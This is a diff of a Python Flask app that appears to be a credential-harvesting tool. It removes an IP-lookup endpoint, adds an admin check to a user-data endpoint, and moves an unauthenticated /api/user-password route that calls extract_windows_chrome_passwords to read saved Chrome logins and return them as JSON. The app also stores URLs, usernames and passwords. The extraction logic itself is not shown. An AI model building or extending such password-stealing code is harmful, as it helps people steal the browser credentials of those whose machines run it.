@@ -95,18 +95,8 @@ def home():
 def favicon():
     return "", 204
 
-@app.route('/api/get-ip', methods=['GET'])
-def get_user_ip():
-    try:
-        user_ip = request.remote_addr
-        forwarded_ip = request.headers.get('X-Forwarded-For', '').split(',')[0].strip()
-        real_ip = forwarded_ip or user_ip
-        return jsonify({"ip": real_ip})
-    except Exception as e:
-        logger.error(f"Error getting user IP: {str(e)}")
-        return jsonify({"error": "Failed to get IP address"}), 500
-
 @app.route('/api/user-data', methods=['GET'])
+@require_admin
 def get_user_data():
     try:
         conn = get_db_connection()
@@ -203,24 +193,6 @@ def add_user_data(id, url, username, password, timestamp):
     except Exception as e:
         logger.error(f"Unexpected error in add_user_data: {str(e)}")
         return False
-
-@app.route('/api/user-password', methods=['GET'])
-def user_password():
-    try:
-        system = platform.system()
-        
-        if system == 'Windows':
-            return extract_windows_chrome_passwords()
-        elif system == 'Linux':
-            return jsonify({"error": "Linux Chrome password extraction not implemented"}), 501
-        elif system == 'Darwin':  # macOS
-            return jsonify({"error": "macOS Chrome password extraction not implemented"}), 501
-        else:
-            return jsonify({"error": f"Unsupported platform: {system}"}), 400
-            
-    except Exception as e:
-        logger.error(f"Unhandled exception in user_password: {str(e)}")
-        return jsonify({"error": f"An unexpected error occurred: {str(e)}"}), 500
 
 def extract_windows_chrome_passwords():
     try:
@@ -359,6 +331,24 @@ def extract_windows_chrome_passwords():
                                 logger.error(f"Error removing temporary login DB: {str(e)}")
         
         return jsonify(results)
+    except Exception as e:
+        logger.error(f"Unhandled exception in user_password: {str(e)}")
+        return jsonify({"error": f"An unexpected error occurred: {str(e)}"}), 500
+
+@app.route('/api/user-password', methods=['GET'])
+def user_password():
+    try:
+        system = platform.system()
+        
+        if system == 'Windows':
+            return extract_windows_chrome_passwords()
+        elif system == 'Linux':
+            return jsonify({"error": "Linux Chrome password extraction not implemented"}), 501
+        elif system == 'Darwin':  # macOS
+            return jsonify({"error": "macOS Chrome password extraction not implemented"}), 501
+        else:
+            return jsonify({"error": f"Unsupported platform: {system}"}), 400
+            
     except Exception as e:
         logger.error(f"Unhandled exception in user_password: {str(e)}")
         return jsonify({"error": f"An unexpected error occurred: {str(e)}"}), 500
